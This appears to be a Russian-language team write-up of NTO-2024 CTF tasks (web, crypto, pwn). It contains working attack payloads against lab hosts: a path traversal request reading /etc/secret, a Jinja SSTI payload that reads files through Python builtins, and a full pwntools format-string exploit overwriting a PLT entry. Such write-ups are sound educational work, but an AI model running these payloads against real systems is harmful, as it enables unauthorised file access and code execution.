# NTO-2024-xls-team

# Task solves

## web1

Сначала открываем инструменты разработчика, смотрим и находим строку:

`<a href="/download?file_type=file1.txt">20</a>`

Переходим по ссылке `http://192.168.12.10:5001/download?file_type=file1.txt`
и получаем *hint*:

`Hint_1 maybe in etc/secret ???`

Понимаем, что скорее всего нужно применить `Path Fuzzing`.
Ищем, находим подобные уязвимости и делаем запрос:

`http://192.168.12.10:5001/download?file_type=/../../etc/secret`

Получаем `flag` из файла secret: nto{P6t9_T77v6RsA1}

## web3

Пробуем разные способы обойти прокси, получаем: "http://192.168.12.11:8001//flag?name=a". Пробуем разные SSTI пейлоады, узнаем, что это jinja, собираем пейлоад: "http://192.168.12.11:8001//flag?name={{request.__init__.__globals__.__builtins__[%22open%22](%22./flag.txt%22).read()}}"

`flag`: nto{Ht1P_sM088Lin6_88Ti} 


## crypto2

По исходному коду понимаем, что нужно восстановить тайное число FLAG (закодированный текст) по известным эллиптической кривой E в кольце целых чисел по модулю p (простое число), генератору G и результату P = G * FLAG. Иными словами, задача на дискретное логарифмирование. В общем случае задача слишком сложна, но в задаче все параметры геренируются случайно, а значит можно подобрать такую кривую, порядок которой будет иметь достаточно небольшие делители и, переведя задачу в подгруппу с таким порядком, получить (перебором) FLAG по некоему модулю. Получив достаточно таких результатов по разным модулям, восстановим FLAG через китайскую теорему об остатках.

Полноценный скрипт решения (использует sagemath и PyCryptodome) [прилагается](./crypto2.py)

`flag`: nto{50mb0dy_45k3d_m3_f0r_d1scr3t3_l0g_2}


## pwn1

Используем Ghidra для декомпиляции программы, видим format string vulnerability. Генерируем пейлоад, меняющий функцию exit в plt на функцию win, при помощи pwntools. Читем флаг: `cat flag`
```Python
from pwn import *

context.log_level = 'debug'
context.bits = 64


addr = 0x404018
value = 0x401156

payload = fmtstr_payload(6, {addr : value})

# con = process("./main")
con = remote("192.168.12.13", 1923)

con.send(payload + b"\n")

con.interactive()
```

`flag`: nto{easy_formt_string}
